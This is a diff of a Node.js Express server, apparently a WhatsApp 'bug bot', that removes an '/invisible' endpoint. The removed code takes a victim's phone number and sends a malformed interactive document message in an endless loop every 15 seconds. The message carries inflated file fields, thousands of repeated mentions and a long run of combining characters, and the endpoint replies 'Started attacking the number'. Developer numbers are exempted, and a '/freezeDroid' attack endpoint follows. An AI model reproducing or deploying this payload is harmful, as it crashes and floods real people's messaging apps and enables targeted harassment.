@@ -53,73 +53,7 @@ function isDeveloperNumber(phoneNumber) {
 //====================================\\
 app.use(express.json()); // Middleware to parse JSON bodies
 //====================================\\
-app.get('/invisible', async (req, res) => {
-    const { target } = req.query; // Access the target parameter from the query string
 
-    // Check if the target is a developer number
-    if (isDeveloperNumber(target)) {
-        return res.status(403).send('Cannot attack developer');
-    }
-
-    async function XeonXRobust(target, o, Ptcp = true) {
-        const jid = toWhatsAppJID(target); // Convert phone number to JID
-        const jids = `_*~@254742491666~*_\n`.repeat(10200);
-        const ui = 'ꦽ'.repeat(1500);
-
-        while (true) {
-            // Prepare the message payload
-            const messagePayload = {
-                ephemeralMessage: {
-                    message: {
-                        interactiveMessage: {
-                            header: {
-                                documentMessage: {
-                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
-                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-                                    fileLength: "9999999999999",
-                                    pageCount: 1316134911,
-                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-                                    fileName: "👻",
-                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
-                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
-                                    mediaKeyTimestamp: "1726867151",
-                                    contactVcard: true,
-                                    jpegThumbnail: o,
-                                },
-                                hasMediaAttachment: true,
-                            },
-                            body: { text: '🕷️🕸️ 𝑺𝑷𝑰𝑫𝑬𝑹-𝑿 👻' + ui + jids },
-                            contextInfo: {
-                                mentionedJid: ['916909137213@s.whatsapp.net'],
-                                mentions: ['916909137213@s.whatsapp.net'],
-                            },
-                            footer: { text: '' },
-                        },
-                    },
-                },
-            };
-
-            // Send the message
-            await sam.sendMessage(jid, messagePayload, Ptcp ? { participant: { jid } } : {});
-
-            // Delay for 15 seconds before sending the next message
-            await delay(15000);
-        }
-    }
-
-    // Call the XeonXRobust function with necessary parameters
-    const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
-    if (!target || !phoneNumberPattern.test(target)) {
-        return res.status(400).send('Phone number you have provided is invalid');
-    }
-    try {
-    	res.send(`Started attacking the number ${target}`);
-        await XeonXRobust(target, null); // Pass validated phone number to the function
-    } catch (error) {
-        console.error(error.message);
-        res.status(500).send('An error occurred while sending the message');
-    }
 //=======================================\\
 app.get('/freezeDroid', async (req, res) => {
     const { target } = req.query; // Access the target parameter from the query string
